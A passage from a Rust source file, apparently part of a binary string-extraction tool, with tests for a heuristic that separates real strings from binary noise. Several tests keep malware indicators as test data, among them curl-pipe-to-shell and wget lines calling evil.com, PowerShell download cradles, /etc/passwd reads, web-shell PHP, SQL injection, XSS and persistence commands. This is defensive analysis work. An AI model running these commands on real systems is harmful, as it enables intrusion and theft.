                && !looks_like_base64
                && !looks_like_format_string
                && !looks_like_url
            {
                return true;
            }
        }
    }

    false
}

/// Check if a byte sequence looks like valid UTF-8 with reasonable content.
#[allow(dead_code)]
pub fn is_valid_string(bytes: &[u8], min_length: usize) -> bool {
    if bytes.len() < min_length {
        return false;
    }

    std::str::from_utf8(bytes).is_ok_and(|s| {
        // Check printability
        let printable = s
            .chars()
            .filter(|c| c.is_ascii_graphic() || c.is_ascii_whitespace())
            .count();
        printable * 2 >= s.len()
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_valid_string_basic() {
        assert!(is_valid_string(b"Hello World", 4));
    }

    #[test]
    fn test_is_valid_string_too_short() {
        assert!(!is_valid_string(b"Hi", 4));
    }

    #[test]
    fn test_is_valid_string_non_printable() {
        assert!(!is_valid_string(b"\x01\x02\x03\x04", 4));
    }

    #[test]
    fn test_is_valid_string_mixed() {
        // More than 50% printable should pass
        assert!(is_valid_string(b"abcd\x01", 4));
    }

    #[test]
    fn test_is_garbage_valid_strings() {
        // Valid strings should NOT be garbage
        assert!(!is_garbage("Hello World"));
        assert!(!is_garbage("go1.22.0"));
        assert!(!is_garbage("/usr/lib/go"));
        assert!(!is_garbage("runtime.memequal"));
        assert!(!is_garbage("SIGFPE: floating-point exception"));
        assert!(!is_garbage("Bool"));
        assert!(!is_garbage("Time"));
        assert!(!is_garbage("linux"));
        assert!(!is_garbage("amd64"));
        assert!(!is_garbage("https://example.com"));
        assert!(!is_garbage("ERROR_CODE_123"));
    }

    #[test]
    fn test_is_garbage_jpeg_metadata() {
        // JPEG/image metadata strings should NOT be garbage
        assert!(!is_garbage("JFIF"));
        assert!(!is_garbage("Photoshop 3.0"));
        assert!(!is_garbage("8BIM")); // Photoshop resource marker
        assert!(!is_garbage("Exif"));
        assert!(!is_garbage("cph/3c13276u.tif"));
        assert!(!is_garbage("1998:12:15 13:03:34"));
        assert!(!is_garbage("Library of Congress"));
        // JPEG quantization table character sequence
        assert!(!is_garbage("%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz"));
    }

    #[test]
    fn test_is_garbage_misaligned_go_reads() {
        // Misaligned Go data patterns should be garbage
        assert!(is_garbage("asL "));
        assert!(is_garbage("``L "));
        assert!(is_garbage("dL "));
        assert!(is_garbage("7aL "));
        assert!(is_garbage("`L "));
        assert!(is_garbage("D`L  "));
        assert!(is_garbage("~dL  "));
        assert!(is_garbage("#uL  "));
        assert!(is_garbage("gkL     @M"));
    }

    #[test]
    fn test_is_garbage_short_binary_patterns() {
        // Short strings that look like misaligned binary data
        assert!(is_garbage("PuO#"));
        assert!(is_garbage("P9O"));
        assert!(is_garbage("8ZAj"));
        assert!(is_garbage("pIo2"));
        assert!(is_garbage("PIO2"));
        assert!(is_garbage("@E?"));
        assert!(is_garbage("P$O"));
        assert!(is_garbage("0Y/("));
        assert!(is_garbage("UoV#"));
        assert!(is_garbage("1j2`1r2l1128"));
        // JPEG/binary compressed data patterns
        assert!(is_garbage("Gi4r"));
        assert!(is_garbage("Uim0"));
        assert!(is_garbage("Ilu4"));
        assert!(is_garbage("cwZd"));
        // More compressed data patterns with interspersed digits
        assert!(is_garbage("9N2A")); // digits interspersed with letters
        assert!(is_garbage("0YI0")); // digits interspersed with letters
        assert!(is_garbage("8oz1")); // leading digit + lowercase (not valid pattern)
        assert!(is_garbage("gnzUrs")); // short mixed case
                                       // Note: "3OEP" looks like "8BIM" (digit + uppercase), can't distinguish without whitelist
                                       // Short strings with internal spaces
        assert!(is_garbage("5c 9"));
        assert!(is_garbage("VW N"));
        // But all-uppercase, all-lowercase, or all-numeric are OK
        assert!(!is_garbage("PFO"));
        assert!(!is_garbage("API"));
        assert!(!is_garbage("foo"));
        assert!(!is_garbage("1234"));
    }

    #[test]
    fn test_is_garbage_short_nonalpha() {
        // Short strings with mostly non-alphanumeric
        assert!(is_garbage("@#$%"));
        assert!(is_garbage("!!!"));
        assert!(is_garbage("   "));
        assert!(is_garbage(""));
    }

    #[test]
    fn test_is_garbage_repeated_chars() {
        // Single repeated characters
        assert!(is_garbage("aaaa"));
        assert!(is_garbage("...."));
        assert!(is_garbage("----"));
    }

    #[test]
    fn test_is_garbage_unicode_endings() {
        // Short strings with non-ASCII unicode at the end
        assert!(is_garbage("333333ӿ"));
        assert!(is_garbage("abcӿ"));
    }

    #[test]
    fn test_is_garbage_control_chars() {
        // Strings with control characters
        assert!(is_garbage("ab\x00cd"));
        assert!(is_garbage("\x01\x02\x03"));
    }

    #[test]
    fn test_is_garbage_single_char() {
        assert!(is_garbage("a"));
        assert!(is_garbage("X"));
        assert!(is_garbage("1"));
    }

    #[test]
    fn test_is_garbage_alternating_pattern() {
        // Alternating digit-letter patterns
        assert!(is_garbage("1a2b3c4d5e"));
    }

    #[test]
    fn test_is_garbage_low_alphanum_ratio() {
        // Less than 30% alphanumeric for strings > 6 chars
        assert!(is_garbage("....!!!!"));
    }

    #[test]
    fn test_is_garbage_unbalanced_parens() {
        assert!(is_garbage("ab(cd"));
        assert!(is_garbage("ab[cd"));
    }

    #[test]
    fn test_is_garbage_single_quote() {
        assert!(is_garbage("ab'cd"));
    }

    #[test]
    fn test_is_garbage_trailing_newline_ok() {
        // Trailing newline should not trigger control char detection
        assert!(!is_garbage("hello world\n"));
    }

    #[test]
    fn test_is_garbage_short_strings_with_dots() {
        // Short strings with dots should not be automatically marked as garbage
        // These are common in filenames and section names
        assert!(!is_garbage("d.exe"), "d.exe should not be garbage");
        assert!(!is_garbage(".blah"), ".blah should not be garbage");
        assert!(!is_garbage("a.out"), "a.out should not be garbage");
        assert!(!is_garbage("lib.so"), "lib.so should not be garbage");

        // Section names specifically (starts with dot)
        assert!(!is_garbage(".text"), ".text should not be garbage");
        assert!(!is_garbage(".data"), ".data should not be garbage");
        assert!(!is_garbage(".bss"), ".bss should not be garbage");
    }

    #[test]
    fn test_is_garbage_base64_strings() {
        // Base64 strings should NOT be garbage
        assert!(!is_garbage("VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl"));
        assert!(!is_garbage("SGVsbG8gV29ybGQh"));
        assert!(!is_garbage("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="));
    }

    #[test]
    fn test_is_garbage_obfuscated_javascript() {
        // Obfuscated JavaScript with hex identifiers should NOT be garbage
        // This is common in malware and should be preserved for analysis
        let test_cases = vec![
            ("const _0x1c1000=_0x230d;", "simple const assignment"),
            ("const _0x1c1000=_0x230d;function _0x230d(_0x996a22,_0x589a56){const _0x11053a=_0x1105();return _0x230d=function(_0x2", "full obfuscated code"),
            ("function _0x230d(_0x996a22,_0x589a56)", "function declaration"),
            ("const _0x1c1000=_0x230d", "const without semicolon"),
            ("_0x230d(_0x996a22,_0x589a56)", "function call"),
            ("return _0x230d", "return statement"),
            ("var _0x4a5b=['base64','encode','decode']", "var with array"),
            ("if(_0x1a2b3c===_0x4d5e6f)", "if statement"),
            ("_0x123abc[_0x456def(0x0)]", "array access"),
        ];

        for (s, desc) in test_cases {
            let result = is_garbage(s);
            assert!(!result, "Obfuscated JavaScript should NOT be garbage: {} - got is_garbage={}", desc, result);
        }
    }

    #[test]
    fn test_is_garbage_shell_shebangs_and_options() {
        // Shebang lines and shell command options should NOT be garbage
        assert!(!is_garbage("#!/bin/sh -eux -o p"));
        assert!(!is_garbage("#!/bin/bash"));
        assert!(!is_garbage("#!/usr/bin/env python3"));
        assert!(!is_garbage("sh -c 'command'"));
        assert!(!is_garbage("bash -eux"));
        assert!(!is_garbage("/bin/sh -e"));
    }

    #[test]
    fn test_is_garbage_obfuscated_python() {
        // Obfuscated Python with mangled identifiers should NOT be garbage
        assert!(!is_garbage("def llIIlIlllllIIlllII(lllIllllIIIllIllII):"));
        assert!(!is_garbage("lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)"));
        assert!(!is_garbage("return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()"));
        assert!(!is_garbage("lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace"));
    }

    #[test]
    fn test_is_garbage_malware_iocs() {
        // IOCs commonly found in malware should NOT be garbage

        // MAC addresses
        assert!(!is_garbage("00:1A:2B:3C:4D:5E"), "MAC address colon format");
        assert!(!is_garbage("00-1A-2B-3C-4D-5E"), "MAC address dash format");
        assert!(!is_garbage("001A.2B3C.4D5E"), "MAC address Cisco format");

        // IPv6 addresses
        assert!(!is_garbage("2001:0db8:85a3:0000:0000:8a2e:0370:7334"), "IPv6 full");
        assert!(!is_garbage("2001:db8:85a3::8a2e:370:7334"), "IPv6 compressed");
        assert!(!is_garbage("::1"), "IPv6 loopback");
        assert!(!is_garbage("fe80::1"), "IPv6 link-local");
        assert!(!is_garbage("2001:db8::192.0.2.1"), "IPv6 with IPv4");

        // Crypto keys and hashes (RC4, AES, etc.)
        assert!(!is_garbage("5f4dcc3b5aa765d61d8327deb882cf99"), "MD5 hash");
        assert!(!is_garbage("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"), "SHA1 hash");
        assert!(!is_garbage("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"), "SHA256 hash");
        assert!(!is_garbage("DEADBEEF1234567890ABCDEF"), "Hex key");

        // Comma-delimited locale/language values
        assert!(!is_garbage("en_US,en,en_GB,fr_FR,de_DE"), "Locale list");
        assert!(!is_garbage("en-US,zh-CN,ja-JP,ko-KR"), "Language codes");
        assert!(!is_garbage("UTF-8,ISO-8859-1,ASCII,UTF-16"), "Encoding list");

        // Obfuscated code patterns - C
        assert!(!is_garbage("char *p=((char*)0x41414141);"), "C pointer obfuscation");
        assert!(!is_garbage("__attribute__((constructor))"), "C attribute");
        assert!(!is_garbage("#define XOR(a,b) ((a)^(b))"), "C macro");

        // Obfuscated code patterns - PHP
        assert!(!is_garbage("eval(base64_decode('SGVsbG8='));"), "PHP eval base64");
        assert!(!is_garbage("${'GLOBALS'}['_GET']"), "PHP dynamic globals");
        assert!(!is_garbage("${$_GET['x']}($_POST['y']);"), "PHP variable variables");
        assert!(!is_garbage("preg_replace('/e/e','system($_GET[c])','');"), "PHP preg_replace /e");

        // Obfuscated code patterns - Perl
        assert!(!is_garbage("eval(pack('H*','48656c6c6f'));"), "Perl eval pack");
        assert!(!is_garbage("system($ARGV[0]);"), "Perl system call");
        assert!(!is_garbage("open(F,'|/bin/sh');"), "Perl pipe open");

        // Obfuscated code patterns - Shell
        assert!(!is_garbage("eval $(echo SGVsbG8K|base64 -d)"), "Shell eval base64");
        assert!(!is_garbage("sh -c 'curl http://evil.com|sh'"), "Shell curl pipe");
        assert!(!is_garbage("${IFS}cat${IFS}/etc/passwd"), "Shell IFS obfuscation");

        // Network indicators
        assert!(!is_garbage("Host: evil.com:8080"), "HTTP host header");
        assert!(!is_garbage("User-Agent: Mozilla/5.0"), "HTTP user agent");
        assert!(!is_garbage("Content-Type: application/x-www-form-urlencoded"), "HTTP content type");
    }

    #[test]
    fn test_is_garbage_non_ascii_strings() {
        // Strings with excessive non-ASCII characters should be garbage
        let test_cases = vec![
            ("/º ¸`¨wl½¶ zmNy", "Path with non-ASCII chars"),
            ("cyl}´á!Qñ#´{ûNy1", "Random with non-ASCII chars"),
            ("CMQpç+9¥g½Ñãiq¸¹:î¦»ölX²", "Long string with non-ASCII"),
            ("?ÔTlbxbµ¥äèêæ", "Short string with non-ASCII"),
            ("ÉBXAÕhDqÌuyóÉµ", "Mixed with non-ASCII"),
            ("ùÉÜÔrzAyÀµCLYìÐ", "Random non-ASCII"),
            ("ë9[R.-XK3`o3ú¼ÁOY", "Special chars with non-ASCII"),
            ("rL*>@«ßtS·` tNV°}*¸", "Symbols with non-ASCII"),
            ("Yapt3OJÃÚ'µ£¦¯È", "Mixed case with non-ASCII"),
            ("`C dJe`eN{Û", "Backtick with non-ASCII"),
        ];

        for (s, desc) in test_cases {
            if !is_garbage(s) {
                eprintln!("FAILED: {} - String: {:?}, len={}, chars={}",
                    desc, s, s.len(), s.chars().count());
            }
            assert!(is_garbage(s), "{}", desc);
        }
    }

    #[test]
    fn test_is_garbage_literal_escape_sequences() {
        // Strings with literal \x escape sequences (not in code context) are garbage
        assert!(is_garbage("RFXA-\\xU*^$U"), "Literal \\x escape outside code");
        assert!(is_garbage("foo\\x41bar"), "Literal \\x in string");

        // But these should NOT be garbage (code context)
        assert!(!is_garbage("print \"\\x41\\x42\\x43\""), "Code with escape sequences");
        assert!(!is_garbage("echo '\\x48\\x65\\x6c\\x6c\\x6f'"), "Shell with escapes");
    }

    #[test]
    fn test_is_garbage_ransomware_and_ctf_iocs() {
        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage

        // Cryptocurrency wallet addresses
        assert!(!is_garbage("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"), "Bitcoin address (legacy)");
        assert!(!is_garbage("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"), "Bitcoin address (P2SH)");
        assert!(!is_garbage("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"), "Bitcoin address (bech32)");
        assert!(!is_garbage("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"), "Ethereum address");
        assert!(!is_garbage("44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"), "Monero address");
        assert!(!is_garbage("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L"), "Litecoin address");
        assert!(!is_garbage("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L"), "Dogecoin address");

        // Cryptocurrency mining pools and stratum URLs
        assert!(!is_garbage("pool.minexmr.com:4444"), "Monero mining pool");
        assert!(!is_garbage("xmr-eu1.nanopool.org:14444"), "Nanopool XMR");
        assert!(!is_garbage("eth-us-east1.nanopool.org:9999"), "Nanopool ETH");
        assert!(!is_garbage("stratum+tcp://pool.supportxmr.com:3333"), "Stratum URL");
        assert!(!is_garbage("stratum+ssl://xmr.pool.minergate.com:45700"), "Stratum SSL");

        // Cryptocurrency miner software names and commands
        assert!(!is_garbage("xmrig"), "XMRig miner");
        assert!(!is_garbage("xmr-stak"), "XMR-Stak miner");
        assert!(!is_garbage("cpuminer-multi"), "CPU miner");
        assert!(!is_garbage("ccminer"), "CUDA miner");
        assert!(!is_garbage("ethminer"), "Ethereum miner");
        assert!(!is_garbage("PhoenixMiner"), "Phoenix miner");
        assert!(!is_garbage("t-rex"), "T-Rex miner");
        assert!(!is_garbage("--donate-level=1"), "Miner donate flag");
        assert!(!is_garbage("-o pool.minexmr.com:4444 -u"), "Miner command line");
        assert!(!is_garbage("--algo=cryptonight"), "Mining algorithm");
        assert!(!is_garbage("--cuda-devices=0,1"), "GPU device selection");

        // Tor/Onion URLs (common in ransomware)
        assert!(!is_garbage("http://thehiddenwiki.onion"), "Onion URL HTTP");
        assert!(!is_garbage("https://3g2upl4pq6kufc4m.onion"), "Onion URL DuckDuckGo");
        assert!(!is_garbage("ransomware2x4ytmz.onion"), "Onion domain only");

        // CTF flag formats
        assert!(!is_garbage("CTF{th1s_1s_4_fl4g}"), "CTF flag format");
        assert!(!is_garbage("flag{base64_encoded_secret}"), "flag{{}} format");
        assert!(!is_garbage("picoCTF{b1n4ry_3xpl01t4t10n}"), "picoCTF format");
        assert!(!is_garbage("HTB{h4ck_th3_b0x}"), "HackTheBox format");
        assert!(!is_garbage("FLAG{SQL_1nj3ct10n_pwn3d}"), "FLAG{{}} format");

        // Email addresses (used in ransomware contact)
        assert!(!is_garbage("decrypt@protonmail.com"), "Ransomware email");
        assert!(!is_garbage("recover.files@tutanota.com"), "Recovery email");
        assert!(!is_garbage("unlock_data@cock.li"), "Contact email");

        // Ransomware file extensions
        assert!(!is_garbage(".locked"), "Locked extension");
        assert!(!is_garbage(".encrypted"), "Encrypted extension");
        assert!(!is_garbage(".crypted"), "Crypted extension");
        assert!(!is_garbage(".wannacry"), "WannaCry extension");
        assert!(!is_garbage(".ryuk"), "Ryuk extension");
        assert!(!is_garbage(".locky"), "Locky extension");

        // Mutex/synchronization names (often weird strings)
        assert!(!is_garbage("Global\\MsWinZonesCacheCounterMutexA"), "Windows mutex");
        assert!(!is_garbage("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}"), "GUID mutex");

        // Windows registry paths
        assert!(!is_garbage("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Registry run key");
        assert!(!is_garbage("HKCU\\Software\\Classes\\exefile\\shell\\open\\command"), "Registry exefile");

        // SQL injection payloads (CTF/pentesting)
        assert!(!is_garbage("' OR '1'='1"), "SQL injection basic");
        assert!(!is_garbage("admin'--"), "SQL comment injection");
        assert!(!is_garbage("1' UNION SELECT NULL,NULL,NULL--"), "SQL union injection");

        // XSS payloads
        assert!(!is_garbage("<script>alert(1)</script>"), "XSS basic");
        assert!(!is_garbage("<img src=x onerror=alert(1)>"), "XSS img tag");
        assert!(!is_garbage("javascript:alert(document.cookie)"), "XSS javascript protocol");

        // Command injection patterns
        assert!(!is_garbage("; cat /etc/passwd"), "Command injection semicolon");
        assert!(!is_garbage("| whoami"), "Command injection pipe");
        assert!(!is_garbage("`id`"), "Command injection backticks");
        assert!(!is_garbage("$(wget http://evil.com/shell.sh)"), "Command injection wget");

        // Persistence mechanisms
        assert!(!is_garbage("schtasks /create /tn \"WindowsUpdate\" /tr"), "Scheduled task");
        assert!(!is_garbage("net user hacker password123 /add"), "User creation");
        assert!(!is_garbage("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Registry persistence");

        // Common malware/CTF tools signatures
        assert!(!is_garbage("powershell -enc"), "PowerShell encoded");
        assert!(!is_garbage("IEX(New-Object Net.WebClient).DownloadString"), "PowerShell download");
        assert!(!is_garbage("certutil -urlcache -split -f"), "Certutil download");
        assert!(!is_garbage("mshta http://evil.com/payload.hta"), "Mshta execution");

        // JWT tokens (common in web CTFs)
        assert!(!is_garbage("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"), "JWT token");

        // RSA/PEM keys (truncated for test)
        assert!(!is_garbage("-----BEGIN PUBLIC KEY-----"), "PEM header");
        assert!(!is_garbage("-----END PRIVATE KEY-----"), "PEM footer");
        assert!(!is_garbage("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"), "RSA key data");

        // Ransom note patterns
        assert!(!is_garbage("YOUR FILES HAVE BEEN ENCRYPTED"), "Ransom message");
        assert!(!is_garbage("Send $500 in Bitcoin to"), "Ransom demand");
        assert!(!is_garbage("DECRYPT-INSTRUCTIONS.txt"), "Ransom note filename");
        assert!(!is_garbage("HOW-TO-DECRYPT.html"), "Decrypt instructions");

        // LDAP/AD paths
        assert!(!is_garbage("LDAP://CN=Users,DC=domain,DC=com"), "LDAP path");
        assert!(!is_garbage("CN=Administrator,CN=Users,DC=corp,DC=local"), "AD distinguished name");

        // API keys/secrets patterns (should preserve structure even if fake)
        assert!(!is_garbage("AKIA0123456789ABCDEF"), "AWS access key format");
        assert!(!is_garbage("ghp_0123456789abcdefghijklmnopqrstuv"), "GitHub token format");
        assert!(!is_garbage("sk_live_0123456789abcdefghijklmn"), "Stripe secret key");
    }

    #[test]
    fn test_is_garbage_xor_malware_samples() {
        // Real garbage strings from XOR-decoded malware (brew_agent sample)
        // These have chaotic character class alternation and should be filtered
        // Note: Some strings with specific patterns (e.g., short with limited special chars)
        // may not be caught by all heuristics, but the majority should be filtered
        let garbage_strings = vec![
            "v*\\^R--E:y4)@O",
            "ZFI7% eE;*\\Y",
            "Z(9uE(/S_B>7/c",
            "#LUU2!FN}v.VDH!#T:y40]P\"L,JSy',E[H\"5/c",
            "#L_G90_<\"J8KFy!!SCy>+FH}v.LXJ",
            "\\?UuC%3YeO9,[<\"J8KFy!!SCy' ]Z",
            "H>@uO*)T:y40]P\"L,JSy4%R\\I%(/c",
            "G$M*y'5RVy2$\\E\"Y(KLI6- eE\"7Cc",
            "P_T1*]Q}v.LXJ",
            "F?T*y'5RVy2$\\E\"Z(MEV0@",
            "IC#*_H}v.LXJ",
            "\\?UuU()SNy17JY\"H!U*y!8IN&",
            "[(\\uG(, eC/,[<\"O.UEU!@",
            "Z(9u@'/PC@>)J<\"O+U_U,@",
            "\\>Q*y\"'ENUW",
            "\\A21\\<\"O!VIMD",
            "\\J8&D<\"O\"IOHD",
            "F.R*y\"/P_HW",
            "[(\\*y\"2EUV2+/c",
            "\\R2)C<\"O9\\FJ+@",
            "@9\\*y#%T_H!Ep[",
            "]C# AJ}v*\\^N+3TTG: /c",
            "^OR,/SNH6(J<\"N(MZQ1)D:y0",
        ];

        for s in &garbage_strings {
            assert!(
                is_garbage(s),
                "XOR garbage string should be filtered: {:?}",
                s
            );
        }
    }
}
